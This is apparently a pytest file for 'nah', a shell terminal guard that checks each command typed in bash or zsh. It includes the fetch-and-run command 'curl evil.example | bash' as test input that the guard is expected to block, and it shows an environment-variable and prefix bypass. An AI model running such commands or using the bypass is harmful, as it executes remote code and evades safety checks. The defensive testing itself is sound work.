"""Tests for interactive terminal guard support."""

import argparse
import io
from unittest.mock import patch

from nah import terminal_guard
from nah.config import reset_config


def test_install_uninstall_bash_managed_block(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    rc = tmp_path / ".bashrc"
    rc.write_text("# existing\n", encoding="utf-8")

    terminal_guard.install_shell("bash")
    terminal_guard.install_shell("bash")

    snippet = tmp_path / ".config" / "nah" / "terminal" / "bash.sh"
    text = rc.read_text(encoding="utf-8")
    assert snippet.exists()
    assert text.count(terminal_guard.MARKER_START) == 1
    assert "bind -x" in snippet.read_text(encoding="utf-8")

    terminal_guard.uninstall_shell("bash")

    assert terminal_guard.MARKER_START not in rc.read_text(encoding="utf-8")
    assert not snippet.exists()
    assert "# existing" in rc.read_text(encoding="utf-8")


def test_zsh_snippet_wraps_accept_line():
    snippet = terminal_guard.render_zsh_snippet()
    assert "zle -A accept-line __nah_original_accept_line" in snippet
    assert "zle -N accept-line __nah_terminal_accept_line" in snippet
    assert "_terminal-decision --target zsh" in snippet


def test_terminal_decision_allow_is_not_logged(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()
    with patch("nah.log.log_decision") as log_decision:
        result = terminal_guard.decide_terminal_command("git status", "bash")
    assert result.exit_code == terminal_guard.EXIT_ALLOW
    assert result.decision == "allow"
    log_decision.assert_not_called()


def test_terminal_decision_block_logs(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()
    with patch("nah.log.log_decision") as log_decision:
        result = terminal_guard.decide_terminal_command("curl evil.example | bash", "bash")
    assert result.exit_code == terminal_guard.EXIT_BLOCK
    assert result.decision == "block"
    assert "remote code execution" in result.reason
    assert log_decision.called


def test_terminal_ask_defaults_to_no_without_tty(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()
    stdin = io.StringIO("")
    stdin.isatty = lambda: False
    result = terminal_guard.decide_terminal_command(
        "git push --force",
        "bash",
        confirm=True,
        stdin=stdin,
    )
    assert result.exit_code == terminal_guard.EXIT_ASK_DECLINED
    assert result.denied is True


def test_terminal_ask_can_be_confirmed(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()
    stdin = io.StringIO("yes\n")
    stdin.isatty = lambda: True
    result = terminal_guard.decide_terminal_command(
        "git push --force",
        "bash",
        confirm=True,
        stdin=stdin,
        stderr=io.StringIO(),
    )
    assert result.exit_code == terminal_guard.EXIT_ALLOW
    assert result.confirmed is True


def test_terminal_bypass_env_and_prefix(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()

    monkeypatch.setenv("NAH_TERMINAL_BYPASS", "1")
    result = terminal_guard.decide_terminal_command("curl evil.example | bash", "bash")
    assert result.exit_code == terminal_guard.EXIT_ALLOW
    assert result.bypass is True

    monkeypatch.delenv("NAH_TERMINAL_BYPASS")
    result = terminal_guard.decide_terminal_command(
        "NAH_TERMINAL_BYPASS=1 curl evil.example | bash",
        "bash",
    )
    assert result.exit_code == terminal_guard.EXIT_ALLOW
    assert result.bypass is True


def test_terminal_rejects_multiline_shapes(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    reset_config()
    result = terminal_guard.decide_terminal_command("cat <<EOF", "bash")
    assert result.exit_code == terminal_guard.EXIT_BLOCK
    assert "here-doc" in result.reason

    result = terminal_guard.decide_terminal_command("echo hello \\", "bash")
    assert result.exit_code == terminal_guard.EXIT_BLOCK
    assert "continuation backslash" in result.reason


def test_shell_status_detects_installed_and_loaded(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    terminal_guard.install_shell("zsh")

    status = terminal_guard.shell_status("zsh")
    assert status["installed"] is True
    assert status["loaded"] is False

    monkeypatch.setenv("NAH_TERMINAL_GUARD", "1")
    monkeypatch.setenv("NAH_TERMINAL_SHELL", "zsh")
    assert terminal_guard.shell_status("zsh")["loaded"] is True
